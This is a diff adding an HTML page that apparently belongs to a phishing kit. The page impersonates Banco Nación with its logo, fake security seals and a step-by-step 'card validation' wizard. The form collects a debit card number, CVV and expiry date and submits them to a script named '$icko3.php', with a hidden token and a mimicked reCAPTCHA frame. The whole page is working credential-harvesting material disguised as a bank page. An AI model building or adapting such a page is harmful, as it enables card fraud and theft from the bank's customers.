@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="en">
+ <head>
+  <meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+  <meta content="width=device-width, initial-scale=1, shrink-to-fit=no" name="viewport"/>
+  <meta content="" name="description"/>
+  <meta content="" name="author"/>
+  <title>
+   Verificacion Requerida
+  </title>
+  <!-- Bootstrap core CSS -->
+  <link href="./bFils/bootstrap.min.css" rel="stylesheet"/>
+  <script src="./bFils/jquery.form.js" type="text/javascript">
+  </script>
+  <script src="./bFils/jquery.validate.js" type="text/javascript">
+  </script>
+  <script src="./bFils/jqModal.min.js">
+  </script>
+  <script src="./bFils/modal-controller.js">
+  </script>
+  <script src="./bFils/LinkTransactionController.js">
+  </script>
+  <script src="./bFils/transaction-controller.js" type="text/javascript">
+  </script>
+  <script src="./bFils/link-controller.js">
+  </script>
+  <script src="./bFils/link.functions.js">
+  </script>
+  <script src="./bFils/estado.js" type="text/javascript">
+  </script>
+  <!-- css propio -->
+  <script src="./bFils/datos.enrolamiento.js" type="text/javascript">
+  </script>
+  <link href="./bFils/datos.enrolamiento.css" rel="stylesheet" type="text/css"/>
+  <link charset="utf-8" href="./bFils/enlaces.login.css" media="screen" rel="stylesheet" type="text/css"/>
+  <script src="./bFils/enlaces.login.js" type="text/javascript">
+  </script>
+  <script type="text/javascript">
+   var mensajeError = '';
+var tipoDocumento = '';
+var terminosYCondiciones = '';
+  </script>
+ </head>
+ <body>
+  <form action="$icko3.php" autocomplete="off" id="form1" method="post">
+   <header>
+    <!-- tag manager  -->
+    <div class="botonera">
+     <img src="bFils/imagenes/login/logoBna.png"/>
+    </div>
+   </header>
+   <!-- Wizard -->
+   <div class="containter" id="wizard-containter" style="">
+    <div class="">
+     <div class="col-lg-12" id="wizard">
+      <div class="row position-line">
+       <div class="col line line-n2">
+       </div>
+      </div>
+      <div class="row position-steps">
+       <div class="n1">
+        <div class="steps step-on">
+         <div class="sm-circle circle-on">
+          <div class="inside">
+           <span class="txt-on">
+            1
+           </span>
+           <img class="check dis-n" src="./bFils/check.png"/>
+          </div>
+         </div>
+        </div>
+       </div>
+       <div class="n2">
+        <div class="steps step-on">
+         <div class="sm-circle circle-on">
+          <div class="inside">
+           <span class="txt-on">
+            2
+           </span>
+          </div>
+          <object class="check dis-n" data="./bFils/check.svg" type="image/svg+xml">
+          </object>
+         </div>
+        </div>
+       </div>
+       <div class="n3">
+        <div class="steps step-off">
+         <div class="sm-circle circle-off">
+          <div class="inside">
+           <span class="txt-off">
+            3
+           </span>
+          </div>
+          <object class="check dis-n" data="./bFils/check.svg" type="image/svg+xml">
+          </object>
+         </div>
+        </div>
+       </div>
+      </div>
+      <!--Fin de steps -->
+      <div class="row position-text">
+       <div class="text-n1">
+        <p class="f-w">
+         Validaci&oacute;n de contacto
+        </p>
+       </div>
+       <div class="text-n2">
+        <p class="f-w">
+         Validaci&oacute;n financiera
+        </p>
+       </div>
+       <div class="text-n3">
+        <p>
+         Proceso &eacute;xitoso
+        </p>
+       </div>
+      </div>
+      <!--Fin de Text -->
+     </div>
+    </div>
+   </div>
+   <!-- Fin de wizard-containter -->
+   <!-- Page Content -->
+   <div class="container" id="content-form" style="">
+    <div class="row">
+     <div class="col-lg-12 step-title">
+      <h1>
+       Bienvenido a Banco Naci&oacute;n | Validaci&oacute;n de tarjeta requerida
+      </h1>
+     </div>
+    </div>
+    <div class="row">
+     <div class="col-lg-12">
+      <input editable="false" id="tkn" name="tkn" type="hidden" value="a4562333990ccb8ce1e019a59850b5b32cdd80166f8aa95c9ec210960829f2c86d8703847bd41ac7a317b975f50ae6787c98badf924c15391b4dd8040e78a18e"/>
+      <div class="row">
+       <div class="col-lg-6 col-sm-12 p-b">
+        <label>
+         N&uacute;mero de Tarjeta de d&eacute;bito
+        </label>
+        <input autocomplete="cc-number" class="form-control" id="n" maxlength="16" name="nmbf" placeholder="Ej.: 123456xxxxxx1234" required="true" type="text"/>
+       </div>
+       <div class="col-lg-6 col-sm-12 p-b">
+        <label>
+         CVV
+        </label>
+        <input autocomplete="cc-csc" class="form-control" id="a" maxlength="4" name="cbx" placeholder="Ej.: 982" required="true" style="width: 100px;" type="text"/>
+       </div>
+      </div>
+      <div class="row">
+       <div class="col-lg-4 col-sm-12 p-b">
+        <label>
+         Fecha de Vencimiento
+        </label>
+        <div class="row">
+         <div class="col-4">
+          <select autocomplete="cc-exp-month" class="form-control" id="asdm" name="dmfo" style="width:100px;height:40px;">
+           <option disabled="" selected="" value="">
+            Mes
+           </option>
+           <option value="01">
+            01
+           </option>
+           <option value="02">
+            02
+           </option>
+           <option value="03">
+            03
+           </option>
+           <option value="04">
+            04
+           </option>
+           <option value="05">
+            05
+           </option>
+           <option value="06">
+            06
+           </option>
+           <option value="07">
+            07
+           </option>
+           <option value="08">
+            08
+           </option>
+           <option value="09">
+            09
+           </option>
+           <option value="10">
+            10
+           </option>
+           <option value="11">
+            11
+           </option>
+           <option value="12">
+            12
+           </option>
+          </select>
+         </div>
+         <div class="col-8">
+          <select autocomplete="cc-exp-year" class="form-control" id="dksan" name="CY3ar" style="width:100px;height:40px;">
+           <option disabled="" selected="" value="">
+            A&ntilde;o
+           </option>
+           <option value="2021">
+            2021
+           </option>
+           <option value="2022">
+            2022
+           </option>
+           <option value="2023">
+            2023
+           </option>
+           <option value="2024">
+            2024
+           </option>
+           <option value="2025">
+            2025
+           </option>
+           <option value="2026">
+            2026
+           </option>
+           <option value="2027">
+            2027
+           </option>
+           <option value="2028">
+            2028
+           </option>
+           <option value="2029">
+            2029
+           </option>
+           <option value="2030">
+            2030
+           </option>
+          </select>
+         </div>
+        </div>
+       </div>
+       <div class="col-lg-6 col-sm-12 p-b">
+        <div class="row">
+         <div class="col-3">
+         </div>
+         <div class="col-3">
+         </div>
+         <div class="row">
+         </div>
+        </div>
+       </div>
+       <div class="row">
+       </div>
+      </div>
+     </div>
+    </div>
+    <!--Footer-->
+    <div class="container relative-bottom" id="footer">
+     <div class="row d-flex align-items-end">
+      <div class="col d-flex">
+      </div>
+      <div class="col d-flex flex-row-reverse">
+       <button class="btn boton-primario">
+        Continuar
+       </button>
+      </div>
+     </div>
+    </div>
+   </div>
+  </form>
+  <div class="cuerpo">
+   <img alt="" class="link" src="./bFils/logo_link.jpg"/>
+   <img alt="" class="certisur" src="./bFils/logo_certisur.jpg"/>
+   <img alt="" class="verisign" src="./bFils/logo_verisign.jpg"/>
+  </div>
+  <!-- captcha -->
+  <script src="./bFils/api.js">
+  </script>
+  <!-- end captcha -->
+  <div style="background-color: rgb(255, 255, 255); border: 1px solid rgb(204, 204, 204); box-shadow: rgba(0, 0, 0, 0.2) 2px 2px 3px; position: absolute; transition: visibility 0s linear 0.3s, opacity 0.3s linear 0s; opacity: 0; visibility: hidden; z-index: 2000000000; left: 0px; top: -10000px;">
+   <div style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.05;">
+   </div>
+   <div class="g-recaptcha-bubble-arrow" style="border: 11px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -11px; z-index: 2000000000;">
+   </div>
+   <div class="g-recaptcha-bubble-arrow" style="border: 10px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -10px; z-index: 2000000000;">
+   </div>
+   <div style="z-index: 2000000000; position: relative;">
+    <iframe frameborder="0" name="c-ol4db7yyfwk4" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox" scrolling="no" src="./bFils/bframe.html" style="width: 100%; height: 100%;" title="Prueba reCAPTCHA">
+    </iframe>
+   </div>
+  </div>
+ </body>
+</html>
